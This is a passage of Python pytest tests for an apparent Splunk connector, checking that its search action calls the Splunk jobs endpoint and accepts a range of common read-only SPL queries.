    seen = fake_vendor(monkeypatch, lambda request: httpx.Response(200, json={"results": [{"count": "3"}]}))
    out = await _connector("splunk").execute_action(
        "search", {"search": "index=main sourcetype=auth action=failure | stats count by user | sort -count"},
    )
    # A success result is the connector's output itself (no status / error keys).
    assert out.get("status") != "failed" and "error" not in out, out
    assert out["count"] == 1 and out["results"] == [{"count": "3"}]
    assert len(seen) == 1 and seen[0].url.path == "/services/search/v2/jobs"


@pytest.mark.asyncio
@pytest.mark.parametrize("spl", [
    "| tstats count where index=main by sourcetype",
    "index=main [ search index=assets | fields host ] | table host",
    "| inputlookup threat_list.csv | where severity=\"high\"",
    "sourcetype=auth | timechart span=1h count by action",
    'index=main | eval note="a|b [c]" | stats count by note',   # separators inside a quoted value
    'index=main | where like(user, "%|%") | head 5',
    "| datamodel Authentication search | stats count",
    'index=main | rex field=_raw "user=(?<user>\\S+)" | stats count by user',   # backslash inside quotes is fine
])
async def test_splunk_search_accepts_common_read_only_shapes(monkeypatch, spl: str) -> None:
    seen = fake_vendor(monkeypatch, lambda request: httpx.Response(200, json={"results": []}))
    out = await _connector("splunk").execute_action("search", {"search": spl})
    assert out.get("status") != "failed" and "error" not in out, out
    assert len(seen) == 1
